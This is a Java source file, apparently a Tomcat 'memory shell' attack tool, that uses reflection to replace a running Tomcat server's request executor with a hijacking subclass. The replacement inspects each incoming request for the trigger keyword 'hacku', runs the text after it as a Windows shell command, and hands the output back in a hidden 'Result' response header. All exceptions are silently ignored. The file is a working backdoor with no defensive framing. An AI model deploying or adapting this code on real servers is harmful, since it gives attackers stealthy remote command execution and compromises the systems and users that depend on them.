import org.apache.tomcat.util.net.NioEndpoint;
import org.apache.tomcat.util.threads.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;
import java.lang.reflect.Field;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.ThreadFactory;
import java.nio.ByteBuffer;
import java.util.ArrayList;
import org.apache.coyote.RequestInfo;
import org.apache.coyote.Response;
import java.io.IOException;
import org.apache.tomcat.util.net.SocketWrapperBase;
import java.nio.charset.StandardCharsets;
import java.net.URLEncoder;

public class TomcatThreadHijack {

    public static Object getField(Object object, String fieldName) {
        Field declaredField;
        Class<?> clazz = object.getClass();
        while (clazz != Object.class) {
            try {
                declaredField = clazz.getDeclaredField(fieldName);
                declaredField.setAccessible(true);
                return declaredField.get(object);
            } catch (NoSuchFieldException | IllegalAccessException ignored) {}
            clazz = clazz.getSuperclass();
        }
        return null;
    }

    public static Object getStandardService() {
        Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), "threads");
        for (Thread thread : threads) {
            if (thread == null) {
                continue;
            }
            if (thread.getName().contains("Acceptor") && thread.getName().contains("http")) {
                Object target = getField(thread, "target");
                Object nioEndPoint = getField(target, "this$0");
                if (nioEndPoint == null) {
                    nioEndPoint = getField(target, "endpoint");
                }
                return nioEndPoint;
            }
        }
        return null;
    }

    static class ThreadExecutor extends ThreadPoolExecutor {

        public ThreadExecutor(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit,
                              BlockingQueue<Runnable> workQueue, ThreadFactory threadFactory,
                              RejectedExecutionHandler handler) {
            super(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, threadFactory, handler);
        }

        public void getRequest(Runnable command) {
            try {
                ByteBuffer byteBuffer = ByteBuffer.allocate(16384);
                byteBuffer.mark();
                SocketWrapperBase<?> socketWrapperBase = (SocketWrapperBase<?>) getField(command, "socketWrapper");
                socketWrapperBase.read(false, byteBuffer);
                ByteBuffer readBuffer = (ByteBuffer) getField(getField(socketWrapperBase, "socketBufferHandler"), "readBuffer");
                readBuffer.limit(byteBuffer.position());
                readBuffer.mark();
                byteBuffer.limit(byteBuffer.position()).reset();
                readBuffer.put(byteBuffer);
                readBuffer.reset();
                String requestData = new String(readBuffer.array(), StandardCharsets.UTF_8);
                if (requestData.contains("hacku")) {
                    String commandStr = requestData.substring(requestData.indexOf("hacku") + "hacku".length() + 1, 
                                                              requestData.indexOf("\r", requestData.indexOf("hacku"))).trim();
                    if (!commandStr.isEmpty()) {
                        executeCommand(commandStr);
                    }
                }
            } catch (Exception ignored) {}
        }

        private void executeCommand(String commandStr) {
            try {
                Process process = Runtime.getRuntime().exec("cmd /c " + commandStr);
                java.io.InputStream in = process.getInputStream();
                java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);
                java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);
                StringBuilder output = new StringBuilder();
                String tmp;
                while ((tmp = stdInput.readLine()) != null) {
                    output.append(tmp);
                }
                if (!output.toString().isEmpty()) {
                    byte[] res = output.toString().getBytes(StandardCharsets.UTF_8);
                    getResponse(res);
                }
            } catch (IOException ignored) {}
        }

        public void getResponse(byte[] res) {
            try {
                Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), "threads");
                for (Thread thread : threads) {
                    if (thread != null) {
                        String threadName = thread.getName();
                        if (!threadName.contains("exec") && threadName.contains("Acceptor")) {
                            Object target = getField(thread, "target");
                            if (target instanceof Runnable) {
                                try {
                                    ArrayList<?> processors = (ArrayList<?>) getField(
                                            getField(getField(getField(target, "endpoint"), "handler"), "global"),
                                            "processors");
                                    for (Object processor : processors) {
                                        RequestInfo requestInfo = (RequestInfo) processor;
                                        Response response = (Response) getField(getField(requestInfo, "req"), "response");
                                        String encodedResult = URLEncoder.encode(new String(res, StandardCharsets.UTF_8),
                                                StandardCharsets.UTF_8.toString());
                                        response.addHeader("Result", encodedResult);
                                    }
                                } catch (Exception ignored) {}
                            }
                        }
                    }
                }
            } catch (Exception ignored) {}
        }

        @Override
        public void execute(Runnable command) {
            getRequest(command);
            super.execute(command);
        }
    }

    public static void main(String[] args) {
        try {
            NioEndpoint nioEndpoint = (NioEndpoint) getStandardService();
            if (nioEndpoint != null) {
                ThreadPoolExecutor exec = (ThreadPoolExecutor) getField(nioEndpoint, "executor");
                ThreadExecutor newExecutor = new ThreadExecutor(
                        exec.getCorePoolSize(),
                        exec.getMaximumPoolSize(),
                        exec.getKeepAliveTime(TimeUnit.MILLISECONDS),
                        TimeUnit.MILLISECONDS,
                        exec.getQueue(),
                        exec.getThreadFactory(),
                        exec.getRejectedExecutionHandler()
                );
                nioEndpoint.setExecutor(newExecutor);
                System.out.println("Successfully replaced Tomcat executor.");
            } else {
                System.out.println("Failed to find Tomcat NioEndpoint.");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
